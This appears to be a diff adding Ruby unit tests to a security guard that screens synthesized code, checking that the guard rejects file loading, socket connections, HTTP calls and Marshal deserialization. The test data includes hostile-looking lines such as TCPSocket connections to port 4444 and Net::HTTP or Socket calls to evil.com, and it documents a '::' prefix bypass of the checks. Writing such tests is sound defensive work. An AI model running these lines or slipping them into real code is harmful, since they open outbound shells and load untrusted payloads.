@@ -205,4 +205,71 @@ class TestSecurityGuardSynthesis < Minitest::Test
       assert @guard.verify_synthesis_safety!(code)
     end
   end
+
+  # ── F2 (Plan 111): file-loading and network/serialization escapes ──
+
+  def test_blocks_bare_require_load_and_autoload
+    codes = [
+      "require 'socket'",
+      'require "./payload"',
+      "require_relative '../lib/evil'",
+      "load './payload.rb'",
+      "autoload :Evil, './evil.rb'",
+      "->(args) { require 'socket'; TCPSocket.new('10.0.0.1', 4444) }"
+    ]
+
+    codes.each do |code|
+      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
+        @guard.verify_synthesis_safety!(code)
+      end
+    end
+  end
+
+  def test_blocks_network_and_marshal_constants_on_any_reference
+    codes = [
+      "TCPSocket.new('10.0.0.1', 4444)",
+      "Socket.tcp('10.0.0.1', 4444)",
+      "UDPSocket.new.send('x', 0, '10.0.0.1', 4444)",
+      "Net::HTTP.get(URI('http://evil.com'))",
+      "Marshal.load(payload)",
+      "X = TCPSocket",
+      "->(args) { S = Socket; S.tcp('evil.com', 4444) }",
+      # Top-level scoped forms parse as :colon3, not :const — the
+      # one-character bypass (review finding, Plan 111).
+      "::TCPSocket.new('10.0.0.1', 4444)",
+      "::Socket.tcp('10.0.0.1', 4444)",
+      "::Marshal.dump(payload)",
+      "::Net::HTTP.get(URI('http://evil.com'))",
+      "X = ::TCPSocket"
+    ]
+
+    codes.each do |code|
+      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
+        @guard.verify_synthesis_safety!(code)
+      end
+    end
+  end
+
+  def test_blocks_top_level_scoped_forbidden_receiver_consts
+    # The pre-existing CONSTS receiver check must also survive :colon3
+    # receivers — ::Kernel.require re-opens the bare-require hole otherwise.
+    codes = [
+      "::Kernel.require('./payload')",
+      "::ENV.fetch('HOME')",
+      "::Thread.new { }"
+    ]
+
+    codes.each do |code|
+      assert_raises(Rubik::Security::BlockedWriteError, "Expected #{code.inspect} to be blocked") do
+        @guard.verify_synthesis_safety!(code)
+      end
+    end
+  end
+
+  def test_permits_ctx_require_coeffect_accessor
+    # :require is forbidden as a BARE call only — ctx.require is the
+    # canonical coeffect accessor every synthesized tool depends on.
+    code = "->(args, ctx) { ctx.require('database').query(args['q']) }"
+    assert @guard.verify_synthesis_safety!(code)
+  end
 end
